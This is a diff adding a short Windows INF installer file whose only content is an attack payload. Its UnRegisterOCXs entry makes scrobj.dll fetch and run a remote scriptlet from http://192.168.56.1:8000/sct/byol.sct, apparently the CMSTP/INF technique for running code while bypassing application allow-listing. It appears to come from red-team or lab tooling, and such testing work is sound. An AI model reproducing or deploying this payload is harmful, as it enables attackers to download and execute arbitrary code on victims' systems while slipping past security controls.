@@ -1,0 +1,14 @@
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,http://192.168.56.1:8000/sct/byol.sct
+
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="BYOL"
+ShortSvcName="BYOL"
